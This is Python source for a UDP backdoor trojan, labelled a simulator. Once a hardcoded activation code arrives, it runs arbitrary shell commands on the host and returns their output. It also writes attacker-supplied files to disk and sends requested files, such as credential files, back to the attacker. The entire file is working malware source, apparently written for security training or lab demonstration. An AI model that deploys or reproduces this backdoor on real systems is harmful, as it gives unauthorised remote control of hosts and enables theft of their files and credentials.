#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        backdoorTrojan.py
#
# Purpose:     This module is used to simulate a trojan to open a backdoor to a
#              allow hacker to remote run commands, steal credential files, insert
#              malware on a host without authorize. 
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1
# Created:     2023/09/21
# Copyright:   n.a
# License:     n.a
#-----------------------------------------------------------------------------

import os
import subprocess
import udpCom

UDP_PORT = 3003
BUF_SZ = 60000
ACT_CODE = 'YCACTTROJAN'
DEBUG_FLG = True
STR_DECODE = 'utf-8'

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

#-----------------------------------------------------------------------------
def base64Convert(data, b64Encode=True):
    """ Encode/decode a str to its base-64 string format.
    Args:
        messageStr (str): can be either base-64 message or plain text message.
        b64Encode (bool): whether the input is to be encoded to base-64, default True.
    Returns:
        string: base-64 message if b64Encode is True; else plain text message.
    """
    import base64
    if b64Encode:
        message_bytes = data.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        return base64_message
    else:
        base64_bytes = data.encode('ascii')
        message_bytes = base64.b64decode(base64_bytes)
        message = message_bytes.decode('ascii')
        return message

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class backdoorTrojan(object):

#-----------------------------------------------------------------------------
    def __init__(self, port=UDP_PORT, actCode=ACT_CODE) -> None:
        self.active = False
        self.actCode = actCode
        self.server = udpCom.udpServer(None, port)
        self.server.setBufferSize(bufferSize=BUF_SZ)

#-----------------------------------------------------------------------------
    def run(self):
        print("Start the backdoor trojan simulator...")
        if DEBUG_FLG: print("Start the UDP echo server listening port [%s]" % UDP_PORT)
        self.server.serverStart(handler=self.cmdHandler)
    
#-----------------------------------------------------------------------------
    def _parseIncomeMsg(self, msg):
        """ Split the trojan connection's control cmd to:
            - reqKey: request key which idenfiy the action category.
            - reqType: request type which detail action type.
            - reqData: request data which will be used in the action.
        """
        reqKey = reqType = reqData = None
        try:
            if isinstance(msg, bytes): msg = msg.decode(STR_DECODE)
            reqKey, reqType, reqData = msg.split(';', 2)
            return (reqKey.strip(), reqType.strip(), reqData)
        except Exception as err:
            print('The incoming message format is incorrect, ignore it.')
            if DEBUG_FLG: print(err)
            return (reqKey, reqType, reqData)

#-----------------------------------------------------------------------------
    def cmdHandler(self, msg):
        """ The test handler method passed into the UDP server to handle the 
            incoming messages.
        """
        if DEBUG_FLG: print("Incomming command: %s" % str(msg))
        if isinstance(msg, bytes): msg = msg.decode('utf-8')
        # handle trojan active request.
        if msg == self.actCode:
            self.active = True
            return 'ready'
        if not self.active: return None
        # if trojan active, handle the attacker's action cmd:
        result = None
        reqKey, reqType, data = self._parseIncomeMsg(msg)
        if reqKey == 'CMD':
            result = self._runCmd(reqType, data)
        elif reqKey == 'FIO':
            result = self._fileIO(reqType, data)
        else:
            result = 'Not support action.'
        return result

#-----------------------------------------------------------------------------
    def _runCmd(self, returnType, cmdStr):
        """ Run a command and collect the result on the victim host.
        Args:
            returnType (str): if == 'detail' return the command execution result, 
                        else return execution success/fail
            cmdStr (str):  command string.
        """
        if returnType and cmdStr:
            try:
                result = subprocess.check_output(str(cmdStr), 
                                                stderr=subprocess.STDOUT, 
                                                shell=True)
                return result if returnType == 'detail' else 'success'
            except Exception as err:
                if DEBUG_FLG: print("Rum cmd error: %s" %str(err))
                return str(err) if returnType == 'detail' else 'fail'
        else:
            return 'error'

#-----------------------------------------------------------------------------
    def _fileIO(self, actionType, data):
        """ File transfer in/out function."""
        global dirpath
        if actionType == 'out':
            filePath = data
            if DEBUG_FLG: print("Transfer victim's file out : %s" %str(filePath))
            return self._copyFileOut(filePath)
        else:
            filename = actionType
            filedata = data
            filePath = os.path.join(dirpath, filename)
            if DEBUG_FLG: print("Create the file in victim: %s " %str(filePath))
            return self._copyFileIn(filePath, filedata)

#-----------------------------------------------------------------------------
    def _copyFileIn(self, filePath, fileData):
        """ Copy file from attacker to victim.
        Args:
            filePath (_type_): victim file path
            fileData (_type_): file data (hex string).
        """
        fileBytes = bytes.fromhex(fileData)
        try:
            with open(filePath, 'wb') as fh:
                fh.write(fileBytes)
            return 'done'
        except Exception as err:
            if DEBUG_FLG: print("File creation error: %s" %str(err))
            return 'error'

#-----------------------------------------------------------------------------
    def _copyFileOut(self, filePath):
        """ Copy file from victim to attacker
        Args:
            filePath (_type_): victim file path.
        """
        fileData = b'error'
        if os.path.exists(filePath):
            try:
                with open(filePath, 'rb') as fh:
                    fileData = fh.read()
                dataStr = fileData.hex()
                return dataStr
            except Exception as err:
                print("File read error: %s" %str(err))
        if DEBUG_FLG: print("Transfer file not found: %s" %str(filePath))
        return fileData.hex()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main(mode):
    trojan = backdoorTrojan()
    trojan.run()

if __name__ == "__main__":
    main(0)

